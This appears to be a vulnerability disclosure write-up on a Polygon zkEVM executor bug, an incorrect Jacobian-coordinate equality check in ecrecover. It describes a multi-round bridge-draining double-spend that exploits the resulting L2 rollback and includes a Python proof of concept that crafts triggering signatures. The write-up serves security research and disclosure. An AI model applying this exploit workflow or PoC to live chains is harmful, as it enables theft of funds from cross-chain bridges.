# Polygon zkEVM Series 2: Executor-Induced Unprovable Transactions

## Defination
The executor-induced unprovable transaction vulnerability in zk systems occurs when the state transition produced by the executor (witness calculator) fails to satisfy the constraint system. This is usually caused by a computational error in the executor.

## Exploitation Scenario

After conducting thorough research, I proposed an attack vector leveraging this vulnerability. This novel exploitation method enables attackers to drain all funds from third-party cross-chain bridges, including Ether and all tokens.

### Key Insight

The necessity of **rolling back the blockchain to recover from the attack** is the core enabler of the double-spend. While the rollback restores L2 balances to their original state, it cannot affect the **GlobalExitRoot** on L1, which holds the leaf nodes added during the attack. This allows the attacker to repeatedly claim illegitimate funds, resulting in significant and unrecoverable losses for third-party cross-chain bridges.

### Detailed Attack Workflow

Assuming the attacker controls account A, the attacked third-party cross-chain bridge account is B, and the official cross-chain bridge account is C, we use subscripts 1 and 2 to represent the same account on L1 and L2. We assume that the initial state of the entire system is as follows:

```
balance(A1) = 0 ETH
balance(A2) = 100 ETH
balance(B1) = 500 ETH
balance(B2) = 500 ETH
balance(C1) = 1000 ETH
```

Please note that we do not define the balance of account C2, as C2 is essentially a pool account, and defining its balance is meaningless. Based on the above definition, the workflow of this attack can be represented step by step as follows.

First, the attacker begins by sending an unprovable transaction, creating a state transition that cannot be proved. Next, the attacker uses the third-party cross-chain bridge to transfer funds from L2 to L1, which requires sending 100 ETH from A2 to B2. After this operation, the state of the whole system is as follows:

```
balance(A1) = 0 ETH
balance(A2) = 0 ETH
balance(B1) = 500 ETH
balance(B2) = 600 ETH
balance(C1) = 1000 ETH
```

Next, the attacker can redeem the corresponding funds from the third-party cross-chain bridge on L1. After this operation, the state of the whole system is as follows:

```
balance(A1) = 100 ETH
balance(A2) = 0 ETH
balance(B1) = 400 ETH
balance(B2) = 600 ETH
balance(C1) = 1000 ETH
```

Next, the attacker uses the official cross-chain bridge to transfer funds from L1 back to L2, which requires sending 100 ETH from A1 to C1. A key point here is that this step added a new leaf node in the GlobalExitRoot to send funds to A2. After this operation, the state of the whole system is as follows:

```
balance(A1) = 0 ETH
balance(A2) = 0 ETH
balance(B1) = 400 ETH
balance(B2) = 600 ETH
balance(C1) = 1100 ETH
```

Next, the attacker can redeem the corresponding funds from the official cross-chain bridge on L2. After this operation, the state of the whole system is as follows:

```
balance(A1) = 0 ETH
balance(A2) = 100 ETH
balance(B1) = 400 ETH
balance(B2) = 600 ETH
balance(C1) = 1100 ETH
```

After the above series of operations, the attacker's funds moved from L2 to L1 and then back to L2. After this round of operations, 100 ETH funds were added to the system we observed. This is because the funds sent to A2 in the last step were minted by the C2 account. The crucial point here is that after this round of operations, a new leaf node was added to the GlobalExitRoot which can be used to send funds to the attacker's account A2.

After the attacker repeats the above operations for 5 rounds, the state of the system is as follows:

```
balance(A1) = 0 ETH
balance(A2) = 100 ETH
balance(B1) = 0 ETH
balance(B2) = 1000 ETH
balance(C1) = 1500 ETH
```

Since the state transition of the transaction sent in the first step is unprovable, the only way to recover from this attack is to roll back the L2 blockchain. Assuming that the L2 blockchain is rolled back after the attacker conducts 5 rounds of attacks, the state of the system at this time is as follows:

```
balance(A1) = 0 ETH
balance(A2) = 100 ETH
balance(B1) = 0 ETH
balance(B2) = 500 ETH
balance(C1) = 1500 ETH
```

A rollback of the L2 blockchain means that the balance of all L2 accounts will be restored to their initial state. Consequently, the balance of account B2 decreased from 1000 ETH to 500 ETH, indicating that the third-party cross-chain bridge lost 500 ETH in these 5 rounds of attacks!

Furthermore, since each round of the attack will add a new leaf node to GlobalExitRoot that can transfer money to the attacker's account A2, a total of 5 such leaf nodes will be added after 5 rounds of attacks. A key point here is that the GlobalExitRoot is saved in the L1 smart contract and thus is not affected by L2 blockchain rollbacks. Therefore, after the L2 blockchain rollback, the attacker can use the 5 leaf nodes added at GlobalExitRoot to redeem the corresponding funds! After the corresponding funds are transferred to the attacker's account, the state of the entire system is as follows:

```
balance(A1) = 0 ETH
balance(A2) = 600 ETH
balance(B1) = 0 ETH
balance(B2) = 500 ETH
balance(C1) = 1500 ETH
```

It can be seen that the attacker made illegal profits of 500 ETH! The attacker can repeat the above attack as many times as desired to steal all the funds from all third-party cross-chain bridges! Besides ETH, all types of tokens in third-party cross-chain bridges can be completely stolen by attackers using the aforementioned technique!



## Case Study: Miscalculations of the Jacobian Coordinate

In forkId5, the executor introduces several performance-enhancing optimizations such as using Jacobian coordinate representation to speed up elliptic curve related calculations. However, due to the complexity of the optimization algorithm, I found a critical vulnerability in it that can lead to incorrect calculations.

Specifically, the executor uses the same logic algorithm as in the ROM to calculate the ecrecover function. However, the formula for comparing the equality of the Jacobian coordinates is incorrectly implemented in the executor. The relevant code is shown below.

```cpp
void generalAddPointEcJacobianZ2Is1(const RawFec::Element &x1, const RawFec::Element &y1, const RawFec::Element &z1,
                               const bool p1_empty,
                               const RawFec::Element &x2, const RawFec::Element &y2, const RawFec::Element &z2,
                               const bool p2_empty,
                               RawFec::Element &x3, RawFec::Element &y3, RawFec::Element &z3,
                               bool &p3_empty)
{

    if (p1_empty && p2_empty)
    {
        p3_empty = true;
        return;
    }
    else
    {
        if (p1_empty)
        {
            fec.copy(x3, x2);
            fec.copy(y3, y2);
            fec.copy(z3, z2);
            p3_empty = p2_empty;
            return;
        }
        else
        {
            if (p2_empty)
            {
                fec.copy(x3, x1);
                fec.copy(y3, y1);
                fec.copy(z3, z1);
                p3_empty = p1_empty;
                return;
            }
            else
            {
                if (fec.eq(fec.mul(x1, z2), fec.mul(x2, z1)) == 0)
                {
                    addPointEcJacobianZ2Is1(x1, y1, z1, x2, y2, z2, x3, y3, z3);
                    if (fec.isZero(z3) == 1)
                    {
                        p3_empty = true;
                    }
                    else
                    {
                        p3_empty = false;
                    }
                }
                else
                {
                    if (fec.eq(fec.mul(y1, z2), fec.mul(y2, z1)) == 0)
                    {
                        p3_empty = true;
                    }
                    else
                    {
                        dblPointEcJacobianZ2Is1(x1, y1, z1, x3, y3, z3);
                        if (fec.isZero(z3) == 1)
                        {
                            p3_empty = true;
                        }
                        else
                        {
                            p3_empty = false;
                        }
                    }
                }
            }
        }
    }
}
```

The key point is the following line:

```cpp
if (fec.eq(fec.mul(x1, z2), fec.mul(x2, z1)) == 0)
```

This line of code tries to check if two points in the Jacobian coordinate system have the same X coordinate. However, the formula `x1 * z2 == x2 * z1` used here is incorrect. The correct formula should be as follows:

```
x1 * z2 ^ 2 == x2 * z1 ^ 2
```

To trigger this bug, the attacker need to craft a signature value such that during one of the calculations in the scalar multiplication operation, the point added to p3 has the same coordinates as p3. This would cause calculations that should be done by the doubling point formula to incorrectly use the point addition formula. Therefore, this will result in the final calculated Ethereum address being incorrect.

This vulnerability was reported to Polygon zkEVM in <span style="color:blue;">August 2023</span> and confirmed as <span style="color:red;">critical severity</span>. 



## Proof of Concept

I use the following code to test this vulnerability. You can easily find the bug by comparing the output of the `calculate` function of the following Python code with the output of the executor.

```python
from ecdsa import SigningKey, SECP256k1
from ecdsa.keys import _truncate_and_convert_digest
from web3 import Web3
from eth_account._utils.legacy_transactions import encode_transaction, serializable_unsigned_transaction_from_dict
from hexbytes import HexBytes
from binascii import unhexlify
from ecdsa.ellipticcurve import INFINITY
from ecdsa.ecdsa import generator_secp256k1
from Crypto.Hash import keccak

def ec_point_to_address(x: int, y: int) -> str:
    public_key = x.to_bytes(32, 'big') + y.to_bytes(32, 'big')
    k = keccak.new(digest_bits=256)
    k.update(public_key)
    address = k.hexdigest()[-40:]
    return "0x" + address

def get_bits(n):
    binary_str = bin(n)[2:]
    while len(binary_str) < 256:
        binary_str = "0" + binary_str
    return binary_str


def calculate(scalar1, scalar2, k):
    print("-----------")
    P = k * generator_secp256k1

    result = None
    scalar1_bits = get_bits(scalar1)
    scalar2_bits = get_bits(scalar2)
    for i in range(256):
        current_scalar1_bit = scalar1_bits[i]
        current_scalar2_bit = scalar2_bits[i]
        current_point = None

        if current_scalar1_bit == '1':
            current_point = generator_secp256k1
            if current_scalar2_bit == '1':
                current_point = generator_secp256k1 + P
        elif current_scalar2_bit == '1':
            current_point = P
            if current_scalar1_bit == '1':
                current_point = generator_secp256k1 + P
    
        if current_point != None:
            if result == None:
                result = current_point
            else:
                print("-----------")
                tmp = result
                result = result + current_point
                print("Add")
                print(tmp.get_coords())
                print(current_point.get_coords())
                print(result.get_coords())
                print("-----------")
        if i != 255 and result != None:
            print("-----------")
            tmp = result
            result = result * 2
            print("Double")
            print(tmp.get_coords())
            print(result.get_coords())
            print("-----------")
    
    
    print("-----------")
    print(result.get_coords())
    affineP = result.to_affine()
    print(affineP)
    print(ec_point_to_address(affineP.x(), affineP.y()))
    return result

def get_leading_bits(n):
    binary_str = bin(n)[2:]
    while len(binary_str) < 256:
        binary_str = "0" + binary_str
    return binary_str[:2]


def main():
    private_key_bytes = unhexlify("ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80")
    private_key = SigningKey.from_string(
        private_key_bytes,
        curve=SECP256k1
    )
    #w3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8123'))
    #from_address = w3.eth.account.from_key(private_key.to_string().hex()).address
    print("from_address: ", "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266")

    value = 0
    while True:
        try:
            transaction_dict = {
                'to': '0x0000000000000000000000000000000000001234',
                'value': value,
                'gas': 21000,
                'gasPrice': 20000000000,
                'nonce': 8,
            }
            unsigned_transaction = serializable_unsigned_transaction_from_dict(transaction_dict)
            transaction_number = _truncate_and_convert_digest(unsigned_transaction.hash(), SECP256k1, False)
            
            k = 2
            sig = private_key.privkey.sign(transaction_number, k)
            v = 27
            inverse_r = pow(sig.r, -1, SECP256k1.order)

            scalar1 = (SECP256k1.order - (transaction_number * inverse_r)) % SECP256k1.order
            scalar2 = (inverse_r * sig.s) % SECP256k1.order
            
            if get_leading_bits(scalar1) != "10":
                value += 1
                continue
            if get_leading_bits(scalar2) != "01":
                value += 1
                continue

            if sig.s > SECP256k1.order / 2:
                value += 1
                continue
            
            encoded_transaction = encode_transaction(unsigned_transaction, vrs=(v, sig.r, sig.s))
            #txn_hash = w3.eth.send_raw_transaction(HexBytes(encoded_transaction))
            
            print("#########################")
            print("scalar1: ", scalar1)
            print("scalar2: ", scalar2)
            print("sig.r: ", sig.r)
            print("sig.s: ", sig.s)
            print("sig.v: ", v)
            print("txhash: ", transaction_number)
            print("#########################")
            calculate(scalar1, scalar2, k)

            break

        except Exception as e:
            print("An error occurred:", e)
            value += 1

if __name__ == "__main__":
    main()
```

To make the above code work you need to modify the ecsda library and add the get_coords function to it.

```python
class PointJacobi(AbstractPoint):
    """
    Point on a short Weierstrass elliptic curve. Uses Jacobi coordinates.

    In Jacobian coordinates, there are three parameters, X, Y and Z.
    They correspond to affine parameters 'x' and 'y' like so:

    x = X / Z²
    y = Y / Z³
    """
    def get_coords(self):
        return self.__coords
```
